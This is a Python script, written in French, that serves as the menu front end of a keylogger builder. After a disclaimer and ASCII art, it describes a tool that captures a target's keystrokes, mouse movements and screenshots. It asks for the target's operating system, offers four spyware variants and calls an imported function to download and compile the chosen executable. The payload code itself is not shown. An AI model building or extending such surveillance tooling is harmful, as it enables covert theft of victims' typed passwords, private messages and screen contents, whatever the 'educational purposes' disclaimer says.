import time
import os
import pygame
from DownloadCompile.download import downloadFileCompile

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")

pygame.mixer.init()
pygame.mixer.music.load("music/gow.mp3")
pygame.mixer.music.play()

#---------DÉBUT AFFICHAGE DU NOM-----------------------

def print_keylogger():
    keylogger_art = r"""These tools are for educational purposes only. Do not use them for malicious activities. Unauthorized use is illegal.

I am not responsible for any misuse. Use them responsibly and ethically.


⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⣀⣠⣤⣴⣶⣶⣶⣶⣶⣶⣶⣦⣤⣄⡀⠀⠀⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣠⡀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠁⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣦⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠄⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⠿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠄⢀⣼⣿⣿⣿⣿⣿⠇⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡻⣿⣿⣿⣿⣿⣷⡀⠘⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠄⢀⣾⣿⣿⣿⣿⣿⣿⡆⢇⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢱⡿⣿⣿⣿⣿⣿⣿⣷⡁⠘⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠈⢀⣾⣿⣿⣿⣿⣿⣿⣿⡇⣸⡴⣟⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⢁⣾⣣⣿⣿⣿⣿⣿⣿⣿⣷⡠⠈⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠠⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⡿⣿⣿⣿⣿⣿⡿⠃⣱⣦⠀⡀⠈⢿⣿⣿⣿⣿⣿⠇⣾⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⡇⠃⠈⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡏⠆⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣿⣹⣿⣿⣿⣿⣷⣶⣿⣿⣷⢁⡀⠈⣿⣿⣿⣿⣿⣾⣿⣿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣿⣿⣿⣃⢻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠢⠀⢘⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⡀⠘⣿⣿⣿⣿
⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⣿⣿⣯⣿⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⣬⣿⣿⣿⣿⣿⣿⢇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠃⠀⣿⣿⣿⣿
⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⠟⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣘⢿⣿⣿⣿⣿⣿⢘⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⢰⠀⣿⣿⣿⣿
⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⢿⣿⣿⠏⡼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢩⣿⣿⣿⣿⡿⢸⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⡷⢸⠀⣿⣿⣿⣿
⣿⣿⣿⣿⡆⡀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⢸⡿⠃⢨⣷⠢⠻⠻⣿⣿⣿⣿⣿⠿⠿⠟⠣⢛⣛⣻⣭⣭⡍⢀⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⡇⠆⢰⣿⣿⣿⣿
⣿⣿⣿⣿⣷⠡⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠚⠑⠐⠉⠉⠁⠁⠀⢀⣀⣀⣤⣤⣶⣶⠢⣸⣿⣿⣿⣿⣿⢁⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠑⠀⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣆⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣧⡣⠀⣤⣴⣶⣾⣿⡔⣆⠀⢻⣿⣿⣿⣿⠃⣰⣿⣿⣿⣿⣿⣿⢐⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⠇⣼⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡎⠄⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⠀⠈⢿⣿⣿⡏⢬⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠣⠃⣰⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣆⢄⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠱⠀⠘⣿⡟⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡣⠁⣸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡠⠀⠙⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⢁⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠊⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣣⡈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣓⠰⢥⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣍⢑⠻⢿⣻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣿⣿⣷⣯⣿⣛⣯⣽⣯⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                    
    """

    for line in keylogger_art.splitlines():
        print(line)
        time.sleep(0.1)

print_keylogger()

#----------FIN AFFICHAGE DU NOM-------------------


#----------DÉBUT RÉCOLTE INFOS DES MACHINES----------------

print("\033[94m [+] Cet outil sert à récolter les touches du clavier, les mouvements de la souris ainsi qu'à faire des captures d'écran de la cible.\n \033[0m")
print("\033[94m [+] Il existe plusieurs version combinant différent type de récolte. \n \033[0m")


# Affichage du texte en vert sans saut à la ligne
print("\033[92m [+] Votre cible est sur windows ou linux ? Tapez 1 pour windows ou 2 pour linux -->\033[0m", end="")

# Récupérer la saisie de l'utilisateur
systemeExploitation = int(input())



while systemeExploitation!=1 and systemeExploitation!=2:
    systemeExploitation = int(input("Veuillez choisir 1 pour windows ou 2 pour linux"))


# Affichage des choix
print("\033[92m[+] Veuillez maintenant choisir la version du keylogger que vous voulez : \n")
print("1. Version keylogger simple")
print("2. Version keylogger avec la récolte des mouvements de la souris")
print("3. Version keylogger avec la capture d'écran")
print("4. Version keylogger avec la capture d'écran ainsi que la récolte des mouvements de la souris")
print("\033[0m")

# Demander à l'utilisateur de choisir
choix = input("\033[92mEntrez votre choix (1, 2, 3 ou 4) : \033[0m")

# Vérifier si le choix est valide
while choix not in ['1', '2', '3', '4']:
    print("\033[91m[!] Choix invalide. Veuillez entrer 1, 2, 3 ou 4.\033[0m")
    choix = input("\033[92mEntrez votre choix (1, 2, 3 ou 4) : \033[0m")


if choix=='1':
    print("\033[92m[+] Vous avez choisi la version du keylogger simple (Effectue la récolte des touches). Veuillez attendre que l'exécutable se télécharge.\033[0m")
elif choix=='2':
    print("\033[92m[+] Vous avez choisi la version du keylogger avec la récolte des mouvements de la souris (Effectue la récolte des touches et des mouvements de la souris). Veuillez attendre que l'exécutable se télécharge.\033[0m")
elif choix=='3':
    print("\033[92m[+] Vous avez choisi la version du keylogger avec la capture d'écran (Effectue la récolte des touches ainsi que des captures d'écran). Veuillez attendre que l'exécutable se télécharge.\033[0m")
elif choix=='4':
    print("\033[92m[+] Vous avez choisi la version du keylogger avec la capture d'écran ainsi que la récolte des mouvements de la souris (Effectue la récolte des touches et des mouvements de la souris ainsi que des captures d'écran). Veuillez attendre que l'exécutable se télécharge.\033[0m")


#-----------FIN RÉCOLTE INFOS DES MACHINES---------------


#-----------DÉBUT INSTALLATION DU BON FICHIER---------------

downloadFileCompile(systemeExploitation,choix)

#----------FIN INSTALLATION DU BON FICHIER-----------------
